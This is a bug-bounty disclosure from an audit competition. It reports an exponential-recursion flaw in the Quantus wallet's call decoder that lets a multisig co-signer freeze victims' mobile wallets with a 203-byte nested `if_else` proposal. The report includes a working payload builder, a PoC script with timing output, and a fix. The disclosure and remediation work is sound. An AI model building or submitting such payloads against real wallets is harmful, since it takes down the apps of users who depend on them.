# 88851 w a high exponential utility if else call display lets a multisig co signer persistently freeze the mobile wallet

**Submitted on Aug 15th 2026 at 07:16:28 UTC by @Ailenia for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88851
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/quantus\\_sdk>
* **Impacts:**
  * Taking down the application/website

## Description

### Brief/Intro

The Quantus SDK describes a `Utility::if_else` primary child twice. Nesting another `if_else` in that child doubles the synchronous display work for every additional five bytes of SCALE input.

An ordinary member of a non-high-security multisig can store a 203-byte proposal that the mobile wallet retrieves from authoritative chain storage and expands on its UI isolate.

This makes the wallet unresponsive and causes the freeze to recur after restart while the affected multisig remains the persisted active account.

### Vulnerability Details

At commit `d5fc4d6572ebc2244e95009a33f5da5048935867`, `quantus_sdk/lib/src/chain/call_decoder.dart:572-581` handles `Utility::if_else` as follows:

```dart
case utility.IfElse(:final main, :final fallback):
  return DecodedCall(
    pallet: 'Utility',
    call: 'if_else',
    fields: [
      NestedCallField('Primary call', describe(main)),
      NestedCallField('Fallback call', describe(fallback)),
    ],
    summary: describe(main).summary,
  );
```

`describe(main)` executes once for the primary field and again for the summary. If the attacker places the next `if_else` in `main` and uses an empty `System::remark` as each fallback, the invocation count is exactly `3·2^depth − 2`, but the payload length is only `5·depth + 3` bytes. Every nearby recursive case avoids this problem by caching the child description and reusing it.

The attacker and victim must be members of the same ordinary, non-high-security multisig already tracked by the victim. The attacker uses the intended `Multisig::propose` permission withoyt needing threshold approval or privileged actor.

The frozen chain validates the call at proposal time. `pallets/multisig/src/lib.rs:594-610` decodes it, obtains its dispatch weight, compares it with `MaxInnerCallWeight`, and applies the high-security policy.

My PoC below configures the published production ceiling and proves that a typed depth-40 `if_else` call is accepted and stored:

```
depth=40 encoded_len=203 call_weight=Weight { ref_time: 3544840000, proof_size: 280160 }
depth=40 encoded_len=203 propose_result=Ok(...)
```

The production ceiling is `Weight { ref_time: 1000000000000, proof_size: 2621440 }`. The payload therefore fits both the 10,240-byte call-size limit and the dispatch-weight limit.

The wallet reaches the defect through this normal flow:

{% stepper %}
{% step %}

## Watch open proposals

`MultisigActivitySection` watches `multisigOpenProposalsProvider` when the active account is a multisig.
{% endstep %}

{% step %}

## Retrieve on-chain call data

`MultisigService.getOpenProposals` calls `_withOnChainCallData`.
{% endstep %}

{% step %}

## Replace proposal data

`_withOnChainCallData` reads each proposal from `Multisig.Proposals` over RPC and replaces the indexer value with the authoritative stored bytes.
{% endstep %}

{% step %}

## Evaluate the call summary

It evaluates `withBytes.decodedCall?.summary` synchronously.
{% endstep %}

{% step %}

## Trigger recursive decoding

`MultisigProposal.decodedCall` invokes `CallDecoder.decodeBytes`, which reaches the duplicated `describe(main)` calls.
{% endstep %}
{% endstepper %}

I couldn't find any decoder nesting limit nor isolate offload. The only scoped `Isolate.spawn` is used by the unrelated human-readable checksum service. A `try/catch` cannot interrupt the computation because the decoder neither throws nor yields.

The active display account is serialized to `SharedPreferences` by `SettingsService.setActiveAccount`. A normal proposal-notification tap also selects and persists the proposal’s multisig before loading its details. On the next launch, the home screen restores that active multisig, loads open proposals, and enters the same synchronous expansion.

The user can recover by clearing application data or reinstalling, or after the proposal stops being returned as open; the claim is persistent application unavailability across restarts, not irreversible loss of the wallet.

## Impact Details

This appears in scope as "Taking down the application/website".

A malicious co-signer can remotely make the victim’s mobile wallet unusable using one small, valid on-chain proposal. Real execution against the frozen decoder took 15.024 seconds at depth 26 with only 133 bytes. A depth-40 payload contains 203 bytes and requires `3,298,534,883,326` `describe` invocations, so the UI isolate cannot complete the display operation in a usable time.

The attacker does not need specific preconditions like a compromised indexer, malicious RPC, MITM, physical device access, local-network access, or multisig threshold approval.

It applies to non-high-security multisigs and to victims who track and load the affected multisig; it does not automatically freeze unrelated accounts or every co-signer device.

## Remediation

Cache the primary description and reuse it:

```dart
case utility.IfElse(:final main, :final fallback):
  final inner = describe(main);
  return DecodedCall(
    pallet: 'Utility',
    call: 'if_else',
    fields: [
      NestedCallField('Primary call', inner),
      NestedCallField('Fallback call', describe(fallback)),
    ],
    summary: inner.summary,
  );
```

Also impose a conservative nesting limit before constructing the display tree and memoize `MultisigProposal.decodedCall`, so future recursive variants cannot cause stack or repeated-work denial of service.

## References

* [Affected `CallDecoder`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/chain/call_decoder.dart#L572-L581)
* [Authoritative proposal-byte retrieval](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/services/multisig_service.dart#L293-L325)
* [Proposal decode getter](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/models/multisig_proposal.dart#L142-L149)
* [Persisted active-account selection](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/services/settings_service.dart#L173-L188)
* [Notification selection and home-screen re-entry](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/lib/v2/screens/home/home_screen.dart#L154-L177)
* [Frozen multisig proposal validation](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L535-L623)
* [Production call-size and inner-weight ceilings](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/configs/mod.rs#L648-L712)

## Proof of Concept

The attached PoC uses isolated Git worktrees at the two frozen competition revisions. It does not contact a Quantus network, broadcast a transaction, or modify the supplied checkouts.

Requirements: Git, Flutter 3.47.0 with Dart 3.13.0, Rust/Cargo 1.93.0, and local clones containing apps commit `d5fc4d6572ebc2244e95009a33f5da5048935867` and chain commit `3b243b870a5442a6e5f443056f67bbba87d472f5`.

Run:

```bash
cd poc
./run.sh /path/to/audit-comp-quantus-apps /path/to/audit-comp-quantus-chain
```

The script performs three complementary demonstrations:

{% stepper %}
{% step %}

## Execute the real decoder

It adds `ifelse_curve_test.dart` only to a disposable apps worktree and executes the real `CallDecoder.decodeBytes` implementation at depths 18, 20, 22, 24, and 26.

Expected output shows approximately fourfold growth every two levels; the retained run reached 15,024 ms at depth 26 for 133 bytes.
{% endstep %}

{% step %}

## Validate production metadata

It applies `chain-production-metadata.patch` only to the disposable chain worktree and runs an integration test against `quantus-runtime`.

The test asserts byte equality with the app’s `[09, 06]` payload, production decoding, the production `5,544,840,000 / 280,160` call weight, both configured ceilings, and the ordinary versus high-security policy result.
{% endstep %}

{% step %}

## Submit the typed nesting shape

It applies `chain-acceptance.patch` to the same disposable chain worktree and submits the typed depth-40 nesting shape through the frozen pallet’s `Multisig::propose` implementation.

This separate mock-runtime test asserts that proposal creation succeeds and its exact 203 encoded bytes are stored; its weight output is not used as the production weight.
{% endstep %}
{% endstepper %}

Decisive retained output:

```
depth 18: 93 bytes -> 167 ms
depth 20: 103 bytes -> 251 ms
depth 22: 113 bytes -> 925 ms
depth 24: 123 bytes -> 5016 ms
depth 26: 133 bytes -> 15024 ms
All tests passed!

production depth=40 encoded_len=203 prefix=[09, 06] call_weight=Weight { ref_time: 5544840000, proof_size: 280160 } max_weight=Weight { ref_time: 1000000000000, proof_size: 2621440 }
test result: ok. 1 passed; 0 failed

mock-runtime depth=40 encoded_len=203 call_weight=Weight { ref_time: 3544840000, proof_size: 280160 }
depth=40 encoded_len=203 propose_result=Ok(PostDispatchInfo { ... })
test result: ok. 1 passed; 0 failed
```

`poc_ifelse_bomb.py` is an offline secondary control that constructs the same payload and verifies `3·2^depth − 2` invocations for every depth from 0 through 22. `call_decoder_ifelse_bomb_test.dart` contains small structural controls and a skipped depth-30 timeout case. `flutter.log`, `production-metadata.log`, `chain.log`, and `SHA256SUMS` preserve the executed receipts and bundle integrity.

## PoC code

Run it with:

```bash
#!/usr/bin/env bash
set -euo pipefail

if [[ $# -ne 2 ]]; then
  echo "usage: $0 /path/to/audit-comp-quantus-apps /path/to/audit-comp-quantus-chain" >&2
  exit 2
fi

bundle_dir="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
apps_repo="$(realpath "$1")"
chain_repo="$(realpath "$2")"
apps_revision=d5fc4d6572ebc2244e95009a33f5da5048935867
chain_revision=3b243b870a5442a6e5f443056f67bbba87d472f5
flutter_bin="${FLUTTER_BIN:-flutter}"
cargo_bin="${CARGO_BIN:-cargo}"
proof_dir="$(mktemp -d "${TMPDIR:-/tmp}/app-ifelse-poc.XXXXXX")"

cleanup() {
  git -C "$apps_repo" worktree remove --force "$proof_dir/apps" >/dev/null 2>&1 || true
  git -C "$chain_repo" worktree remove --force "$proof_dir/chain" >/dev/null 2>&1 || true
  rm -rf -- "$proof_dir"
}
trap cleanup EXIT

git -C "$apps_repo" cat-file -e "$apps_revision^{commit}"
git -C "$chain_repo" cat-file -e "$chain_revision^{commit}"

git -C "$apps_repo" worktree add --detach "$proof_dir/apps" "$apps_revision"
cp "$bundle_dir/ifelse_curve_test.dart" "$proof_dir/apps/quantus_sdk/test/chain/ifelse_curve_test.dart"
(
  cd "$proof_dir/apps/quantus_sdk"
  "$flutter_bin" pub get
  "$flutter_bin" test test/chain/ifelse_curve_test.dart
)

git -C "$chain_repo" worktree add --detach "$proof_dir/chain" "$chain_revision"
git -C "$proof_dir/chain" apply "$bundle_dir/chain-acceptance.patch"
git -C "$proof_dir/chain" apply "$bundle_dir/chain-production-metadata.patch"
(
  cd "$proof_dir/chain"
  SKIP_WASM_BUILD=1 "$cargo_bin" test -p quantus-runtime --test app_ifelse_production_metadata production_runtime_metadata_accepts_app_if_else_payload -- --nocapture
  SKIP_WASM_BUILD=1 "$cargo_bin" test -p pallet-multisig if_else_display_bomb_is_accepted_and_stored -- --nocapture
)
```

## The diff to PoC

```diff
diff --git a/runtime/tests/app_ifelse_production_metadata.rs b/runtime/tests/app_ifelse_production_metadata.rs
new file mode 100644
--- /dev/null
+++ b/runtime/tests/app_ifelse_production_metadata.rs
@@ -0,0 +1,65 @@
+use codec::{Decode, Encode};
+use frame_support::{dispatch::GetDispatchInfo, traits::Get};
+use qp_high_security::HighSecurityInspector;
+use quantus_runtime::{
+	configs::{HighSecurityConfig, MaxCallSize, MaxInnerCallWeight},
+	RuntimeCall,
+};
+
+fn leaf() -> RuntimeCall {
+	RuntimeCall::System(frame_system::Call::remark { remark: Vec::new() })
+}
+
+fn typed_bomb(depth: usize) -> RuntimeCall {
+	let mut nested = leaf();
+	for _ in 0..depth {
+		nested = RuntimeCall::Utility(pallet_utility::Call::if_else {
+			main: Box::new(nested),
+			fallback: Box::new(leaf()),
+		});
+	}
+	nested
+}
+
+fn app_payload(depth: usize) -> Vec<u8> {
+	let leaf = [0_u8, 0, 0];
+	let mut payload = leaf.to_vec();
+	for _ in 0..depth {
+		payload = [vec![9_u8, 6], payload, leaf.to_vec()].concat();
+	}
+	payload
+}
+
+#[test]
+fn production_runtime_metadata_accepts_app_if_else_payload() {
+	const DEPTH: usize = 40;
+
+	let call = typed_bomb(DEPTH);
+	let encoded = call.encode();
+	let expected = app_payload(DEPTH);
+	assert_eq!(encoded, expected, "production RuntimeCall encoding must match the app payload");
+	assert_eq!(encoded.len(), 5 * DEPTH + 3);
+	assert_eq!(&encoded[..2], &[9, 6], "production Utility/if_else indices changed");
+
+	let decoded = RuntimeCall::decode(&mut &encoded[..]).expect("production RuntimeCall decodes");
+	assert_eq!(decoded.encode(), encoded, "production decode must consume the same call");
+
+	let call_weight = decoded.get_dispatch_info().call_weight;
+	let max_weight = MaxInnerCallWeight::get();
+	assert!(!call_weight.any_gt(max_weight), "production call exceeds MaxInnerCallWeight");
+	assert!(encoded.len() <= MaxCallSize::get() as usize, "production call exceeds MaxCallSize");
+	assert!(
+		HighSecurityConfig::is_call_allowed_given(false, &decoded),
+		"ordinary multisig policy must allow the call"
+	);
+	assert!(
+		!HighSecurityConfig::is_call_allowed_given(true, &decoded),
+		"high-security policy must reject the call"
+	);
+
+	println!(
+		"production depth={DEPTH} encoded_len={} prefix={:02x?} call_weight={call_weight:?} max_weight={max_weight:?}",
+		encoded.len(),
+		&encoded[..2]
+	);
+}
```
